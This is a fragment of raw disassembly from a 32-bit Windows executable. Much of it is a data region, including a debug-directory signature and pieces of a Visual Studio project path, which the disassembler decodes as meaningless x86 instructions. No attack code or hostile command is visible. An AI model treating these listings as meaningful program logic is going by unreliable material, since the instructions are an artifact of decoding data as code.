  420f59:	cmp    edx,DWORD PTR [eax]
  420f5b:	add    BYTE PTR [ecx+0x25],dh
  420f5e:	adc    BYTE PTR [eax],al
  420f60:	fld    TBYTE PTR [ecx]
  420f62:	adc    BYTE PTR [eax],al
  420f64:	xchg   edi,eax
  420f65:	sub    al,0x10
  420f67:	add    dh,ah
  420f69:	aaa    
  420f6a:	adc    BYTE PTR [eax],al
  420f6c:	and    eax,0xd5001051
  420f71:	xor    dl,BYTE PTR [eax]
  420f73:	add    BYTE PTR [eax-0x13ffefd8],ch
  420f79:	push   cs
  420f7a:	inc    edx
  420f7b:	add    al,dh
  420f7d:	push   cs
  420f7e:	inc    edx
  420f7f:	add    ah,dh
  420f81:	push   cs
  420f82:	inc    edx
  420f83:	add    al,bh
  420f85:	push   cs
  420f86:	inc    edx
  420f87:	add    ah,bh
  420f89:	push   cs
  420f8a:	inc    edx
  420f8b:	add    BYTE PTR [eax],al
  420f8d:	cmovb  eax,DWORD PTR [eax]
  420f90:	add    al,0xf
  420f92:	inc    edx
  420f93:	add    BYTE PTR [eax],cl
  420f95:	cmovb  eax,DWORD PTR [eax]
  420f98:	adc    DWORD PTR [ebp+0x10],ebx
  420f9b:	add    bh,cl
  420f9d:	push   es
  420f9e:	adc    BYTE PTR [eax],al
  420fa0:	xchg   esp,eax
  420fa1:	xor    eax,0x7b780010
  420fa6:	adc    BYTE PTR [eax],al
  420fa8:	stos   BYTE PTR es:[edi],al
  420fa9:	jo     0x420fbb
  420fab:	add    BYTE PTR [eax],ch
  420fad:	inc    esp
  420fae:	adc    BYTE PTR [eax],al
  420fb0:	pop    ebp
  420fb1:	pop    ecx
  420fb2:	adc    BYTE PTR [eax],al
  420fb4:	fild   QWORD PTR [edi]
  420fb6:	adc    BYTE PTR [eax],al
	...
  420fc0:	push   edx
  420fc1:	push   ebx
  420fc2:	inc    esp
  420fc3:	push   ebx
  420fc4:	es pop ds
  420fc6:	ret    0x68e1
  420fc9:	xchg   edi,eax
  420fca:	das    
  420fcb:	dec    edx
  420fcc:	scas   eax,DWORD PTR es:[edi]
  420fcd:	iret   
  420fce:	aad    0x98
  420fd0:	aad    0x48
  420fd2:	xor    eax,esi
  420fd4:	add    DWORD PTR [eax],eax
  420fd6:	add    BYTE PTR [eax],al
  420fd8:	inc    ebx
  420fd9:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  420fdd:	jb     0x421051
  420fdf:	outs   dx,BYTE PTR gs:[esi]
  420fe1:	je     0x421027
  420fe3:	popa   
  420fe4:	je     0x421047
  420fe6:	pop    esp
  420fe7:	dec    ebp
  420fe8:	outs   dx,DWORD PTR ds:[esi]
  420fe9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  420ff1:	ins    BYTE PTR es:[edi],dx
  420ff2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  420ff9:	dec    esi
  420ffa:	gs ja  0x420ffd
  420ffd:	add    BYTE PTR [eax],al
  420fff:	add    BYTE PTR [eax],al
  421001:	add    BYTE PTR [eax],al
  421003:	add    BYTE PTR [edx-0x2c],cl
  421006:	mov    bl,0x4d
  421008:	add    BYTE PTR [eax],al
  42100a:	add    BYTE PTR [eax],al
  42100c:	xor    dl,BYTE PTR [eax]
  42100e:	add    al,BYTE PTR [eax]
  421010:	add    DWORD PTR [eax],eax
  421012:	add    BYTE PTR [eax],al
  421014:	add    DWORD PTR [eax],eax
  421016:	add    BYTE PTR [eax],al
  421018:	add    DWORD PTR [eax],eax
  42101a:	add    BYTE PTR [eax],al
  42101c:	sub    BYTE PTR [eax],dl
  42101e:	add    al,BYTE PTR [eax]
  421020:	sub    al,0x10
  421022:	add    al,BYTE PTR [eax]
  421024:	xor    BYTE PTR [eax],dl
  421026:	add    al,BYTE PTR [eax]
  421028:	mov    edi,0x3e000020
  42102d:	adc    BYTE PTR [edx],al
  42102f:	add    BYTE PTR [eax],al
  421031:	add    BYTE PTR [ebx+0x79],dl
  421034:	ins    DWORD PTR es:[edi],dx
  421035:	bound  ebp,QWORD PTR [edi+0x6c]
  421038:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  42103f:	inc    ebx
  421040:	ins    BYTE PTR es:[edi],dx
  421041:	outs   dx,DWORD PTR ds:[esi]
  421042:	jae    0x4210a9
  421044:	push   edi
  421045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42104c:	popa   
  42104d:	je     0x4210b8
  42104f:	outs   dx,DWORD PTR ds:[esi]
  421050:	outs   dx,BYTE PTR ds:[esi]
  421051:	inc    ebx
  421052:	ins    BYTE PTR es:[edi],dx
  421053:	outs   dx,DWORD PTR ds:[esi]
  421054:	jae    0x4210bb
  421056:	push   edi
  421057:	.byte 0x69
